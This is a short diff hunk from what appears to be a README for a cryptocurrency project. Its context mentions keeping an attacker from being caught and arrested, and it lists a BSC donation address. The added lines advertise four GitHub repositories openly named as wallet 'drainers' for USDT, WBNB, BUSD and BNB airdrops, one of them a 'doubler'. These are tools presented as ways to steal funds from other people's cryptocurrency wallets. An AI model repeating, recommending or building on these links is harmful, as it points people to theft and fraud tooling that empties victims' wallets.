@@ -124,6 +124,14 @@ doesnt get caught. This prevents the attacker from being caught and arrested, th
 donations
 bsc addr : 0xE1cA176A421347b998a6168bf501735A958612E1
 
+!!! Check out my new USDT token hack https://github.com/moneywithbots/bnb-eth-usdt-wallet-drainer !!!
+
+!!! Check out my new Bnb airdrop drainer https://github.com/moneywithbots/bnb-airdrop-drainer !!!
+
+!!! Check out my new WBNB drainer https://github.com/moneywithbots/bnb-eth-wbnb-wallet-drainer !!!
+
+!!! Check out my new Busd doubler drainer https://github.com/moneywithbots/bnb-busd-doubler-drainer !!!
+
 
 
 MIT License
